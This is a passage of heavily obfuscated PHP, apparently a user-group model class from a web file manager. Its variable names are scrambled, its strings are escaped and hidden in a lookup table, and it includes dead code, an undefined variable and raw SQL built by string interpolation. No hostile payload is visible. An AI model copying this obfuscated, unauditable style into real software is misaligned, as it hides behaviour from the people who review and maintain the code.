$ğÛÀ’Ú[2115] => $ÔËäç‹, $ğÛÀ’Ú[2116] => $ÔËäç‹ / $ÃÕµğ›ô, $ğÛÀ’Ú[93] => $Š¹è«™À, $ğÛÀ’Ú[2117] => $ñƒ°¶ÚŠ); return $‹‚ÏáÚ; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\155\x65" => "\x67\x72\x6f\165\160\x5f\x6d\145\x74\141", "\x6d\145\x74\x61\x46\151\145\154\x64" => "\147\x72\x6f\165\160\x49\104"); protected function cacheFunctionAlias($òé®Ğ­Ø) { $»Óµ—óÕ =& $_SERVER[¬ÏÕ§Áú]; return array($»Óµ—óÕ[2118] => array($òé®Ğ­Ø[0], $»Óµ—óÕ[2119]), $»Óµ—óÕ[2120] => array($òé®Ğ­Ø[0], $»Óµ—óÕ[2121])); } protected function getInfo($±Äó’‰Ÿ, $ÚÑÍóİû = false) { $ê˜™’ã£ = $this->getInfoSimple($±Äó’‰Ÿ); if (!$ê˜™’ã£) { return !1; } if ($ÚÑÍóİû) { return $this->_listDataApplyItem($ê˜™’ã£); } return $this->cacheFunctionGet($_SERVER[¬ÏÕ§Áú][2122], $±Äó’‰Ÿ); } protected function getInfoSimple($ìÂ‹æğ´, $Ÿƒ‰æ²† = false) { $ë­ğ¨Ì¯ =& $_SERVER[¬ÏÕ§Áú]; if ($Ÿƒ‰æ²†) { $´­Ñ½ğ† = array($ë­ğ¨Ì¯[1445] => intval($ìÂ‹æğ´)); $£´Ä±ÎÅ = $this->where($´­Ñ½ğ†)->find(); return is_array($£´Ä±ÎÅ) ? $£´Ä±ÎÅ : array(); } return $this->cacheFunctionGet($ë­ğ¨Ì¯[2123], $ìÂ‹æğ´); } protected function groupAdd($ç—ù¬…À) { $Ø²øçËÎ =& $_SERVER[¬ÏÕ§Áú]; if (!$ç—ù¬…À[$Ø²øçËÎ[203]] && isset($ç—ù¬…À[$Ø²øçËÎ[1445]]) && $ç—ù¬…À[$Ø²øçËÎ[1445]] == 1) { if ($è³£´ô„ = $this->getInfoSimple($ç—ù¬…À[$Ø²øçËÎ[1445]], !0)) { return $ç—ù¬…À[$Ø²øçËÎ[1445]]; } } else { $è³£´ô„ = $this->getInfoSimple($ç—ù¬…À[$Ø²øçËÎ[203]]); if (!$è³£´ô„) { return !1; } } $†‹³ö° = $Ø²øçËÎ[614]; if ($è³£´ô„[$Ø²øçËÎ[605]]) { $†‹³ö° = $è³£´ô„[$Ø²øçËÎ[605]] . $è³£´ô„[$Ø²øçËÎ[1445]] . $Ø²øçËÎ[50]; } $¨¶™ùÙï = array($Ø²øçËÎ[514] => $this->groupNameAuto($ç—ù¬…À[$Ø²øçËÎ[203]], $ç—ù¬…À[$Ø²øçËÎ[32]]), $Ø²øçËÎ[497] => $ç—ù¬…À[$Ø²øçËÎ[203]], $Ø²øçËÎ[676] => $†‹³ö°, $Ø²øçËÎ[2124] => $ç—ù¬…À[$Ø²øçËÎ[2024]], $Ø²øçËÎ[2125] => 0, $Ø²øçËÎ[2041] => 0); $ç—ù¬…À[$Ø²øçËÎ[32]] = $¨¶™ùÙï[$Ø²øçËÎ[32]]; if (isset($ç—ù¬…À[$Ø²øçËÎ[2061]])) { $¨¶™ùÙï[$Ø²øçËÎ[2061]] = $ç—ù¬…À[$Ø²øçËÎ[2061]]; } else { $¿¡ÏŸ¯› = $this->max($Ø²øçËÎ[2061]); if (!$¿¡ÏŸ¯›) { $¿¡ÏŸ¯› = 0; } $¨¶™ùÙï[$Ø²øçËÎ[2061]] = $¿¡ÏŸ¯› + 1; } if (!empty($ç—ù¬…À[$Ø²øçËÎ[1445]])) { $¨¶™ùÙï[$Ø²øçËÎ[1445]] = $ç—ù¬…À[$Ø²øçËÎ[1445]]; } $±³øÅĞ = $this->add($¨¶™ùÙï); $this->groupMetaEdit($±³øÅĞ, $ç—ù¬…À); Model($Ø²øçËÎ[1483])->groupRootAdd($±³øÅĞ); $this->_clearCache($ç—ù¬…À[$Ø²øçËÎ[203]]); return $±³øÅĞ; } protected function groupEdit($÷¾ºØ…¯, $äı€¥Øù) { $ÉëÉ‚–ş =& $_SERVER[¬ÏÕ§Áú]; $®í¬İÚö = $this->getInfoSimple($÷¾ºØ…¯); if (!$®í¬İÚö) { return !1; } if (!empty($äı€¥Øù[$ÉëÉ‚–ş[203]])) { $­Ó’‘ª = $this->getInfoSimple($äı€¥Øù[$ÉëÉ‚–ş[203]]); if (!$­Ó’‘ª) { return !1; } if ($®í¬İÚö[$ÉëÉ‚–ş[1445]] == $­Ó’‘ª[$ÉëÉ‚–ş[1445]]) { return !1; } if ($äı€¥Øù[$ÉëÉ‚–ş[203]] != $®í¬İÚö[$ÉëÉ‚–ş[203]]) { if ($­Ó’‘ª[$ÉëÉ‚–ş[605]] !== $®í¬İÚö[$ÉëÉ‚–ş[605]] && strpos($­Ó’‘ª[$ÉëÉ‚–ş[605]], $®í¬İÚö[$ÉëÉ‚–ş[605]] . $®í¬İÚö[$ÉëÉ‚–ş[1445]] . $ÉëÉ‚–ş[50]) === 0) { return !1; } $äı€¥Øù[$ÉëÉ‚–ş[676]] = $­Ó’‘ª[$ÉëÉ‚–ş[605]] . $äı€¥Øù[$ÉëÉ‚–ş[203]] . $ÉëÉ‚–ş[50]; $this->_changeChildLevel($®í¬İÚö, $­Ó’‘ª); $this->_clearCache($­Ó’‘ª[$ÉëÉ‚–ş[1445]]); $this->_clearCache($®í¬İÚö[$ÉëÉ‚–ş[203]]); } } $this->groupMetaEdit($÷¾ºØ…¯, $äı€¥Øù); $this->_clearChildrenCache($®í¬İÚö); return $this->where(array($ÉëÉ‚–ş[2126] => $÷¾ºØ…¯))->save($äı€¥Øù); } private function groupMetaEdit($óäûõ™, &$š¿ªÎ¬ë) { $¼¸–¦×¯ =& $_SERVER[¬ÏÕ§Áú]; if (isset($š¿ªÎ¬ë[$¼¸–¦×¯[32]])) { $this->setNamePinyin($óäûõ™, $š¿ªÎ¬ë[$¼¸–¦×¯[32]]); } if (isset($š¿ªÎ¬ë[$¼¸–¦×¯[2127]])) { $¹¥¯±Ê = array($¼¸–¦×¯[2127] => $š¿ªÎ¬ë[$¼¸–¦×¯[2127]], $¼¸–¦×¯[2128] => $š¿ªÎ¬ë[$¼¸–¦×¯[2128]]); unset($š¿ªÎ¬ë[$¼¸–¦×¯[2127]]); unset($š¿ªÎ¬ë[$¼¸–¦×¯[2128]]); if (isset($š¿ªÎ¬ë[$¼¸–¦×¯[2129]])) { $š©¤”îö = $¼¸–¦×¯[1441] . $óäûõ™; $ÎÄŠÃ»ñ = $¼¸–¦×¯[1440]; $…®¦—­ = $š¿ªÎ¬ë[$¼¸–¦×¯[2129]] ? $š¿ªÎ¬ë[$¼¸–¦×¯[2129]] : $¼¸–¦×¯[12]; $ÑåÆÊà½ = Model($¼¸–¦×¯[1439])->get($š©¤”îö, $ÎÄŠÃ»ñ); $ÑåÆÊà½ = $ÑåÆÊà½ ? $ÑåÆÊà½ : $¼¸–¦×¯[12]; if ($ÑåÆÊà½ != $…®¦—­) { if (!$…®¦—­ && $ÑåÆÊà½) { Model($¼¸–¦×¯[1439])->remove($š©¤”îö, $ÎÄŠÃ»ñ); } else { if ($…®¦—­) { Model($¼¸–¦×¯[1439])->set($š©¤”îö, $…®¦—­, $ÎÄŠÃ»ñ); } } } $¹¥¯±Ê[$¼¸–¦×¯[2129]] = $…®¦—­; } $this->metaSet($óäûõ™, $¹¥¯±Ê); } } private function _clearChildrenCache($ƒ¬‘îµ) { $ş¤…ú¦ø =& $_SERVER[¬ÏÕ§Áú]; $ßõõë¬® = array($ş¤…ú¦ø[676] => array($ş¤…ú¦ø[636], $ƒ¬‘îµ[$ş¤…ú¦ø[605]] . $ƒ¬‘îµ[$ş¤…ú¦ø[1445]] . $ş¤…ú¦ø[637])); $µÒ„¦³¨ = $this->field($ş¤…ú¦ø[1445])->where($ßõõë¬®)->select(); foreach ($µÒ„¦³¨ as $†ªÜİÑÎ) { $this->_clearCache($†ªÜİÑÎ[$ş¤…ú¦ø[1445]]); } } private function _clearCache($Œƒíõ´) { $üÖğÅœ» =& $_SERVER[¬ÏÕ§Áú]; $this->cacheFunctionClear($üÖğÅœ»[2122], $Œƒíõ´); $this->cacheFunctionClear($üÖğÅœ»[2123], $Œƒíõ´); } private function _changeChildLevel($‡ şò…©, $†¦Îî‡„, $èùøä„¤ = false) { $šºõ¬Êí =& $_SERVER[¬ÏÕ§Áú]; $¿á«ÑÎÇ = $‡ şò…©[$šºõ¬Êí[605]] . $‡ şò…©[$šºõ¬Êí[1445]] . $šºõ¬Êí[50]; $§¡İßÓ = $†¦Îî‡„[$šºõ¬Êí[605]] . $†¦Îî‡„[$šºõ¬Êí[1445]] . $šºõ¬Êí[50] . $‡ şò…©[$šºõ¬Êí[1445]] . $šºõ¬Êí[50]; if ($èùøä„¤) { $§¡İßÓ = $†¦Îî‡„[$šºõ¬Êí[605]] . $†¦Îî‡„[$šºõ¬Êí[1445]] . $šºõ¬Êí[50]; } $î«òâ·´ = array($šºõ¬Êí[676] => array($šºõ¬Êí[636], $‡ şò…©[$šºõ¬Êí[605]] . $‡ şò…©[$šºõ¬Êí[1445]] . $šºõ¬Êí[637])); $Â˜šíê‚ = array($šºõ¬Êí[676] => array($šºõ¬Êí[685], "\x72\x65\160\x6c\141\143\145\50\160\x61\x72\x65\x6e\164\114\145\x76\x65\x6c\54\x27{$¿á«ÑÎÇ}\x27\x2c\47{$§¡İßÓ}\47\51")); $this->_clearChildrenCache($‡ şò…©); $this->where($î«òâ·´)->data($Â˜šíê‚)->save(); } public function setNamePinyin($‘ÍÒ™Û, $ï¶­ß‡ = false) { $‚­„š’ =& $_SERVER[¬ÏÕ§Áú]; if (!$ï¶­ß‡) { $Ù®çì¹ = $this->getInfoSimple($‘ÍÒ™Û); $ï¶­ß‡ = $Ù®çì¹[$‚­„š’[32]]; } if (!Input::check($ï¶­ß‡, $‚­„š’[679])) { $this->metaSet($‘ÍÒ™Û, $‚­„š’[557], null); $this->metaSet($‘ÍÒ™Û, $‚­„š’[556], null); return; } $«…«¾‰š = array($‚­„š’[557] => str_replace($‚­„š’[53], $‚­„š’[12], Pinyin::get($ï¶­ß‡)), $‚­„š’[556] => Pinyin::get($ï¶­ß‡, $‚­„š’[680])); $this->metaSet($‘ÍÒ™Û, $«…«¾‰š); } protected function metaSet($Á†ü–ŒÑ, $ÃÏË”Æ½ = null, $‰ºóºÖ¥ = null) { $this->_clearCache($Á†ü–ŒÑ); return parent::metaSet($Á†ü–ŒÑ, $ÃÏË”Æ½, $‰ºóºÖ¥); } protected function groupStatus($ÓÑ†ÚÕ, $’ê¹ùé) { $ËÛºŠĞÚ =& $_SERVER[¬ÏÕ§Áú]; $—µ´¸…ˆ = $this->getInfoSimple($ÓÑ†ÚÕ); if (!$—µ´¸…ˆ) { return !1; } $this->_clearCache($ÓÑ†ÚÕ); return $this->metaSet($ÓÑ†ÚÕ, $ËÛºŠĞÚ[863], $’ê¹ùé); if ($’ê¹ùé == $ËÛºŠĞÚ[101]) { $ä¬ñ–Ñ® = $this->parentLevelArray($—µ´¸…ˆ[$ËÛºŠĞÚ[605]]); } else { } $ä¬ñ–Ñ®[] = $—µ´¸…ˆ[$ËÛºŠĞÚ[1445]]; $´î”¢é = array(); foreach ($ä¬ñ–Ñ® as $ÓÑ†ÚÕ) { $´î”¢é[] = array($ËÛºŠĞÚ[1445] => $ÓÑ†ÚÕ, $ËÛºŠĞÚ[107] => $ËÛºŠĞÚ[863], $ËÛºŠĞÚ[461] => $’ê¹ùé); $this->_clearCache($ÓÑ†ÚÕ); } return Model($ËÛºŠĞÚ[2130])->addAll($´î”¢é, array(), !0); } protected function groupRemove($äÏ¶¬œ, $Èõ ½±Ù = false) { $Ş…İõÖç =& $_SERVER[¬ÏÕ§Áú]; $ö¥ú‡áï = array($Ş…İõÖç[1445] => $äÏ¶¬œ); $ôá¤àûÁ = $this->where($ö¥ú‡áï)->find(); if (!$ôá¤àûÁ || $ôá¤àûÁ[$Ş…İõÖç[203]] == 0) { return !1; } if (!$Èõ ½±Ù) { $®ÁÜı¼ = $this->getInfoSimple($ôá¤àûÁ[$Ş…İõÖç[203]]); $this->_changeChildLevel($ôá¤àûÁ, $®ÁÜı¼, !0); $this->where(array($Ş…İõÖç[203] => $äÏ¶¬œ))->save(array($Ş…İõÖç[203] => $ôá¤àûÁ[$Ş…İõÖç[203]])); $this->_clearCache($®ÁÜı¼[$Ş…İõÖç[1445]]); } Model($Ş…İõÖç[2130])->where($ö¥ú‡áï)->delete(); Model($Ş…İõÖç[2131])->where($ö¥ú‡áï)->delete(); Model($Ş…İõÖç[946])->groupRootRemove($äÏ¶¬œ); $this->_clearCache($ôá¤àûÁ[$Ş…İõÖç[203]]); return $this->where($ö¥ú‡áï)->delete(); } protected function groupSort($³ŠÓ°Ò) { $€İÁ„úê =& $_SERVER[¬ÏÕ§Áú]; $æªºáŒ = array(); foreach ($³ŠÓ°Ò as $Ù§•¸¿Œ => $¢Ÿö€Â) { $æªºáŒ[] = array($€İÁ„úê[1445], $¢Ÿö€Â, $€İÁ„úê[2061], $Ù§•¸¿Œ + 1); } $this->saveAll($æªºáŒ); } public function listData() { $ïŸ×©¡¸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ïŸ×©¡¸[$_SERVER[¬ÏÕ§Áú][456]]); return $ïŸ×©¡¸; } private function _makeOrder($†”ˆ¨Åº = '') { $Æİ„Œ›¯ =& $_SERVER[¬ÏÕ§Áú]; $Ÿİ¥ª»Î = array($Æİ„Œ›¯[1445], $Æİ„Œ›¯[32], $Æİ„Œ›¯[2026], $Æİ„Œ›¯[244]); $ì­öí® = array($Æİ„Œ›¯[542] => $Æİ„Œ›¯[543], $Æİ„Œ›¯[544] => $Æİ„Œ›¯[545]); $ÃÕ‘©¾Ã = Input::get($Æİ„Œ›¯[549], $Æİ„Œ›¯[7], $Æİ„Œ›¯[2041], $Ÿİ¥ª»Î); $áŠæáü¯ = Input::get($Æİ„Œ›¯[550], $Æİ„Œ›¯[7], $Æİ„Œ›¯[2132], array($Æİ„Œ›¯[2132], $Æİ„Œ›¯[544])); $áŠæáü¯ = $ì­öí®[$áŠæáü¯]; $†”ˆ¨Åº = $†”ˆ¨Åº . "{$ÃÕ‘©¾Ã}\x20{$áŠæáü¯}\54\x20\x67\x72\157\165\x70\111\104\x20\141\x73\x63"; return $this->order($†”ˆ¨Åº); } public function listChild($Ó€Ëèæ–) { $«âÇ›¥ =& $_SERVER[¬ÏÕ§Áú]; $ÃºØî¢¾ = $this->where(array($«âÇ›¥[203] => $Ó€Ëèæ–))->_makeOrder()->selectPage(200); $this->_listDataApply($ÃºØî¢¾[$«âÇ›¥[456]]); return $ÃºØî¢¾; } public function listChildIds($ë•ëÚŞ) { $×çµÇ¥µ =& $_SERVER[¬ÏÕ§Áú]; if (is_string($Şöç–‰Ú)) { $ë•ëÚŞ = explode($×çµÇ¥µ[50], $ë•ëÚŞ); } $Œó½ŞÛÏ = $this->where(array($×çµÇ¥µ[1445] => array($×çµÇ¥µ[7], $ë•ëÚŞ)))->field($×çµÇ¥µ[2133])->select(); if (!$Œó½ŞÛÏ) { return !1; } $ó€úÂªÍ = array(); foreach ($Œó½ŞÛÏ as $ÃŞİã¨Ó) { $ó€úÂªÍ[] = "\x73\x65\x6c\x65\x63\164\x20\147\162\x6f\x75\x70\111\104\x20\x66\x72\x6f\x6d\x20\140\147\x72\157\x75\x70\140\40\167\x68\145\x72\145\40\x70\141\x72\x65\156\164\114\145\166\x65\x6c\x20\x6c\151\153\x65\40\x27{$ÃŞİã¨Ó[$×çµÇ¥µ[605]]}{$ÃŞİã¨Ó[$×çµÇ¥µ[1445]]}\54\x25\47"; } $ó€úÂªÍ = implode($×çµÇ¥µ[2134], $ó€úÂªÍ); $Œó½ŞÛÏ = $this->query($ó€úÂªÍ); if (!$Œó½ŞÛÏ) { return array(); } $ë•ëÚŞ = array_to_keyvalue($Œó½ŞÛÏ, $×çµÇ¥µ[12], $×çµÇ¥µ[1445]); return array_unique($ë•ëÚŞ); } public function listByID($´•æÁİÖ) { $²òÄÍùÙ =& $_SERVER[¬ÏÕ§Áú]; if (!$´•æÁİÖ) { return array(); } $÷¢úğË‰ = array($²òÄÍùÙ[1445] => array($²òÄÍùÙ[7], $´•æÁİÖ)); $û‡½¡¢Å = $this->where($÷¢úğË‰)->select(); $û‡½¡¢Å = array_sort_keep($û‡½¡¢Å, $²òÄÍùÙ[1445], $´•æÁİÖ); $this->_listDataApply($û‡½¡¢Å); return $û‡½¡¢Å; } public function listSearch($õ–œş•) { $Ì•ëèÌ =& $_SERVER[¬ÏÕ§Áú]; $ÖšÌš§ù = trim($õ–œş•[$Ì•ëèÌ[2135]]); $ş¼…ñşÂ = explode($Ì•ëèÌ[53], $ÖšÌš§ù); if (!$ÖšÌš§ù || count($ş¼…ñşÂ) == 1) { return $this->listSearchNow($õ–œş•); } $“»ò—×  = array($Ì•ëèÌ[456] => array()); foreach ($ş¼…ñşÂ as $ÑäŸ—ÅÊ) { if (!trim($ÑäŸ—ÅÊ)) { continue; } $õ–œş•[$Ì•ëèÌ[2135]] = $ÑäŸ—ÅÊ; $ºç¬Û—É = $this->listSearchNow($õ–œş•); $“»ò—× [$Ì•ëèÌ[456]] = array_merge($“»ò—× [$Ì•ëèÌ[456]], $ºç¬Û—É[$Ì•ëèÌ[456]]); } $“»ò—× [$Ì•ëèÌ[456]] = array_unique_by_key($“»ò—× [$Ì•ëèÌ[456]], $Ì•ëèÌ[1445]); $“»ò—× [$Ì•ëèÌ[453]] = array($Ì•ëèÌ[454] => count($“»ò—× [$Ì•ëèÌ[456]]), $Ì•ëèÌ[450] => 20, $Ì•ëèÌ[439] => 1, $Ì•ëèÌ[455] => 1); return $“»ò—× ; } public function listSearchNow($ùĞÏÇÍÙ) { $¢ˆõ•ë =& $_SERVER[¬ÏÕ§Áú]; $Å»æ––º = trim($ùĞÏÇÍÙ[$¢ˆõ•ë[2135]]); $çÁÔÁ£ = isset($ùĞÏÇÍÙ[$¢ˆõ•ë[2136]]) ? $ùĞÏÇÍÙ[$¢ˆõ•ë[2136]] : !1; if (!trim($Å»æ––º)) { return !1; } $Å»æ––º = str_replace($¢ˆõ•ë[2137], $¢ˆõ•ë[2138], $Å»æ––º); $¨³÷÷í = array($¢ˆõ•ë[1445] => array($¢ˆõ•ë[479], "{$Å»æ––º}\x25"), $¢ˆõ•ë[32] => array($¢ˆõ•ë[479], "\45{$Å»æ––º}\45"), $¢ˆõ•ë[1125] => $¢ˆõ•ë[2139]); if ($çÁÔÁ£) { $Â¶¿¤¥ = $this->getInfoSimple($çÁÔÁ£); $ÜŠì¸õ¡ = $Â¶¿¤¥[$¢ˆõ•ë[605]] . $çÁÔÁ£ . $¢ˆõ•ë[637]; $¨³÷÷í = array($¨³÷÷í, array($¢ˆõ•ë[605] => array($¢ˆõ•ë[479], $ÜŠì¸õ¡))); } $¨³÷÷í = $this->parseWhereLike($¨³÷÷í); $–šÈ‡­¡ = $this->_makeOrder()->where($¨³÷÷í)->selectPage(20); $–šÈ‡­¡ = $–šÈ‡­¡ ? $–šÈ‡­¡ : array($¢ˆõ•ë[456] => array(), $¢ˆõ•ë[453] => array()); if (!$–šÈ‡­¡ || count($–šÈ‡­¡[$¢ˆõ•ë[456]]) < 5 && Input::check($Å»æ––º, $¢ˆõ•ë[404])) { $Åñó•ìö = $this->groupChildrenAll($çÁÔÁ£); $òè´‘ªù = $this->_searchFromMeta($¢ˆõ•ë[556], $Å»æ––º, 10, $Åñó•ìö); $ÑØ½òÀ» = $this->_searchFromMeta($¢ˆõ•ë[557], $Å»æ––º, 10, $Åñó•ìö); $Ä²Ç”ç = array_merge($òè´‘ªù, $ÑØ½òÀ», $–šÈ‡­¡[$¢ˆõ•ë[456]]); $–šÈ‡­¡[$¢ˆõ•ë[456]] = array_unique_by_key($Ä²Ç”ç, $¢ˆõ•ë[1445]); $–šÈ‡­¡[$¢ˆõ•ë[453]][$¢ˆõ•ë[454]] = count($–šÈ‡­¡[$¢ˆõ•ë[456]]); $–šÈ‡­¡[$¢ˆõ•ë[453]][$¢ˆõ•ë[455]] = ceil($–šÈ‡­¡[$¢ˆõ•ë[453]][$¢ˆõ•ë[454]] / $–šÈ‡­¡[$¢ˆõ•ë[453]][$¢ˆõ•ë[450]]); } $this->_listDataApply($–šÈ‡­¡[$¢ˆõ•ë[456]]); return $–šÈ‡­¡; } protected function groupChildrenAll($Œ¥¡¿Œæ) { $ÉÖÂ¯ãŸ =& $_SERVER[¬ÏÕ§Áú]; if (!$Œ¥¡¿Œæ) { return !1; } if (!is_array($Œ¥¡¿Œæ)) { $Œ¥¡¿Œæ = array($Œ¥¡¿Œæ); } $ê•õÎ²™ = $Œ¥¡¿Œæ; foreach ($Œ¥¡¿Œæ as $®³Øß»æ) { $ÖÚÈ“Õ = $this->getInfoSimple($®³Øß»æ); $³Ô‘ÍÆÑ = array($ÉÖÂ¯ãŸ[605] => array($ÉÖÂ¯ãŸ[479], $ÖÚÈ“Õ[$ÉÖÂ¯ãŸ[605]] . $®³Øß»æ . $ÉÖÂ¯ãŸ[637])); $é°ıô½ = $this->field($ÉÖÂ¯ãŸ[1445])->where($³Ô‘ÍÆÑ)->select(); $ê•õÎ²™ = array_merge($ê•õÎ²™, array_to_keyvalue($é°ıô½, $ÉÖÂ¯ãŸ[12], $ÉÖÂ¯ãŸ[1445])); } return array_unique($ê•õÎ²™); } private function _searchFromMeta($šÔ±…€”, $˜¤Ü ­, $³ÏûÕÅæ, $°üª’Şò) { $¢ÅÂš³Ó =& $_SERVER[¬ÏÕ§Áú]; $˜¤Ü ­ = strtolower($˜¤Ü ­); $§¼Ìø¼ = array($¢ÅÂš³Ó[107] => $šÔ±…€”, $¢ÅÂš³Ó[461] => array($¢ÅÂš³Ó[479], "\45{$˜¤Ü ­}\45")); $§¼Ìø¼ = $this->parseWhereLike($§¼Ìø¼); if ($°üª’Şò) { $§¼Ìø¼[$¢ÅÂš³Ó[1445]] = array($¢ÅÂš³Ó[7], $°üª’Şò); } $õçíÚ‚ğ = Model($¢ÅÂš³Ó[2140])->where($§¼Ìø¼)->limit($³ÏûÕÅæ)->select(); if (!$õçíÚ‚ğ) { return array(); } $õçíÚ‚ğ = array_to_keyvalue($õçíÚ‚ğ, $¢ÅÂš³Ó[12], $¢ÅÂš³Ó[1445]); $í¼íĞ†« = $this->where(array($¢ÅÂš³Ó[2126] => array($¢ÅÂš³Ó[7], $õçíÚ‚ğ)))->select(); if (!$í¼íĞ†«) { return array(); } return $í¼íĞ†«; } protected function _listDataApplyItem($³¤ÓÃï–) { $êÖÄñü¦ = array($³¤ÓÃï–); $this->_listDataApply($êÖÄñü¦); return $êÖÄñü¦[0]; } protected function _listDataApply(&$àéÙÍÇ) { $ŞÔËåÊ =& $_SERVER[¬ÏÕ§Áú]; if (!$àéÙÍÇ) { return; } $øœÉ„Ä = array_to_keyvalue($àéÙÍÇ, $ŞÔËåÊ[12], $ŞÔËåÊ[1445]); $this->_listAppendChildren($àéÙÍÇ); $this->_listAppendChildrenMember($àéÙÍÇ); $this->_listAppendMeta($àéÙÍÇ, $øœÉ„Ä); $this->_listAppendParent($àéÙÍÇ); $this->_listAppendSourceRoot($àéÙÍÇ, $øœÉ„Ä); } private function _listAppendChildren(&$şàŒŠ™) { $àØÎıü‰ =& $_SERVER[¬ÏÕ§Áú]; $åìòÇ·Ë = array_to_keyvalue($şàŒŠ™, $àØÎıü‰[12], $àØÎıü‰[1445]); $ÑÂñÙÑ¤ = array($àØÎıü‰[203] => array($àØÎıü‰[7], $åìòÇ·Ë)); $êÄôŞÇû = array($àØÎıü‰[203], $àØÎıü‰[2141] => $àØÎıü‰[586]); $ÙÙˆî = $this->field($êÄôŞÇû)->where($ÑÂñÙÑ¤)->group($àØÎıü‰[203])->select(); $š•ÒÌšø = array_to_keyvalue($ÙÙˆî, $àØÎıü‰[203], $àØÎıü‰[586]); foreach ($şàŒŠ™ as &$ñÙä°Ş) { $µ¥³¼Öï = $ñÙä°Ş[$àØÎıü‰[1445]]; $ñÙä°Ş[$àØÎıü‰[2142]] = isset($š•ÒÌšø[$µ¥³¼Öï]) ? intval($š•ÒÌšø[$µ¥³¼Öï]) : !1; } unset($ñÙä°Ş); } private function _listAppendChildrenMember(&$àÉã¾¥Á) { $¸°§×¿² =& $_SERVER[¬ÏÕ§Áú]; $Ô²Ñº = array_to_keyvalue($àÉã¾¥Á, $¸°§×¿²[12], $¸°§×¿²[1445]); $àÑ¦–æš = array($¸°§×¿²[1445] => array($¸°§×¿²[7], $Ô²Ñº)); $©ºæ¨µÓ = array($¸°§×¿²[1445], $¸°§×¿²[2141] => $¸°§×¿²[586]); $ÒÛòÎÃ¶ = Model($¸°§×¿²[2131])->field($©ºæ¨µÓ)->where($àÑ¦–æš)->group($¸°§×¿²[1445])->select(); $¶İ÷á™´ = array_to_keyvalue($ÒÛòÎÃ¶, $¸°§×¿²[1445], $¸°§×¿²[586]); foreach ($àÉã¾¥Á as &$ÜŞ×ğû—) { $¬¿şß®Ï = $ÜŞ×ğû—[$¸°§×¿²[1445]]; $ÜŞ×ğû—[$¸°§×¿²[2143]] = isset($¶İ÷á™´[$¬¿şß®Ï]) ? intval($¶İ÷á™´[$¬¿şß®Ï]) : !1; } unset($ÜŞ×ğû—); } private function _listAppendMeta(&$åü”€ç±, $è¿ú¦®) { $íÛ¦Ôá­ =& $_SERVER[¬ÏÕ§Áú]; $ÒûÆª… = array($íÛ¦Ôá­[1445] => array($íÛ¦Ôá­[7], $è¿ú¦®)); $‡‹‘º¢Š = Model($íÛ¦Ôá­[2130])->where($ÒûÆª…)->select(); $‡‹‘º¢Š = array_to_keyvalue_group($‡‹‘º¢Š, $íÛ¦Ôá­[1445]); foreach ($‡‹‘º¢Š as &$ì¡ÔôÚ) { $ì¡ÔôÚ = array_to_keyvalue($ì¡ÔôÚ, $íÛ¦Ôá­[107], $íÛ¦Ôá­[461]); } unset($ì¡ÔôÚ); foreach ($åü”€ç± as &$®£Ö•Â) { $®£Ö•Â[$íÛ¦Ôá­[560]] = array(); if (isset($‡‹‘º¢Š[$®£Ö•Â[$íÛ¦Ôá­[1445]]])) { $®£Ö•Â[$íÛ¦Ôá­[560]] = $‡‹‘º¢Š[$®£Ö•Â[$íÛ¦Ôá­[1445]]]; } } unset($®£Ö•Â); } protected function parentLevelArray($„ÙÆÒï) { $ëŠõ¡×õ =& $_SERVER[¬ÏÕ§Áú]; $„ÙÆÒï = explode($ëŠõ¡×õ[50], trim($„ÙÆÒï, $ëŠõ¡×õ[50])); $„ÙÆÒï = array_remove_value($„ÙÆÒï, $ëŠõ¡×õ[241]); return $„ÙÆÒï; } protected function parentInGroup($ó­£ß¦, $…®ñ³ğİ) { $±îØĞŒ° =& $_SERVER[¬ÏÕ§Áú]; $Õª”†ì¥ = $this->getInfoSimple($ó­£ß¦); if (!$Õª”†ì¥) { return !0; } $¬ƒş£‘ = $this->parentLevelArray($Õª”†ì¥[$±îØĞŒ°[605]]); $¬ƒş£‘[] = $ó­£ß¦; foreach ($¬ƒş£‘ as $ó­£ß¦) { if (in_array($ó­£ß¦ . $±îØĞŒ°[12], $…®ñ³ğİ)) { return !0; } } return !1; } private function _listAppendParent(&$Ù›ã³™Ÿ) { $™Ã°Äü½ =& $_SERVER[¬ÏÕ§Áú]; $ø¢å¦ª¯ = array(); foreach ($Ù›ã³™Ÿ as &$ÆÄëß÷Î) { $ø¢å¦ª¯[$ÆÄëß÷Î[$™Ã°Äü½[1445]]] = $ÆÄëß÷Î[$™Ã°Äü½[32]]; $Îëµ†íÓ = $this->parentLevelArray($ÆÄëß÷Î[$™Ã°Äü½[605]]); foreach ($Îëµ†íÓ as $ò¹ùÍÇŒ) { if (!isset($ø¢å¦ª¯[$ò¹ùÍÇŒ])) { $ø¢å¦ª¯[$ò¹ùÍÇŒ] = 0; } } } unset($ÆÄëß÷Î); foreach ($ø¢å¦ª¯ as $„€ç¢«¿ => $§ªşªÓ) { if ($§ªşªÓ) { continue; } $–—Š¹±Œ = $this->getInfoSimple($„€ç¢«¿); $ø¢å¦ª¯[$„€ç¢«¿] = $–—Š¹±Œ[$™Ã°Äü½[32]]; } $×•éñ›ˆ = $GLOBALS[$™Ã°Äü½[6]][$™Ã°Äü½[102]][$™Ã°Äü½[2144]]; if (KodUser::isRoot()) { $×•éñ›ˆ = !1; } foreach ($Ù›ã³™Ÿ as &$ÆÄëß÷Î) { $Îëµ†íÓ = $this->parentLevelArray($ÆÄëß÷Î[$™Ã°Äü½[605]]); $å¦­¸Ô× = $™Ã°Äü½[12]; foreach ($Îëµ†íÓ as $„€ç¢«¿ => $ò¹ùÍÇŒ) { if ($×•éñ›ˆ && $„€ç¢«¿ == 0) { continue; } $å¦­¸Ô× .= $ø¢å¦ª¯[$ò¹ùÍÇŒ] . $™Ã°Äü½[8]; } if ($Îëµ†íÓ) { $å¦­¸Ô× .= $ÆÄëß÷Î[$™Ã°Äü½[32]]; } $ÆÄëß÷Î[$™Ã°Äü½[610]] = str_replace($™Ã°Äü½[267], $™Ã°Äü½[8], $å¦­¸Ô×); } unset($ÆÄëß÷Î); } private function _listAppendSourceRoot(&$¡äàÊœÍ, $’üÌÇÌ) { $ó»­Â·ô =& $_SERVER[¬ÏÕ§Áú]; $şšŸ¯ï = Model($ó»­Â·ô[946])->listSourceRoot(SourceModel::TYPE_GROUP, $’üÌÇÌ); $şšŸ¯ï = array_to_keyvalue($şšŸ¯ï, $ó»­Â·ô[590]); $şšŸ¯ï = 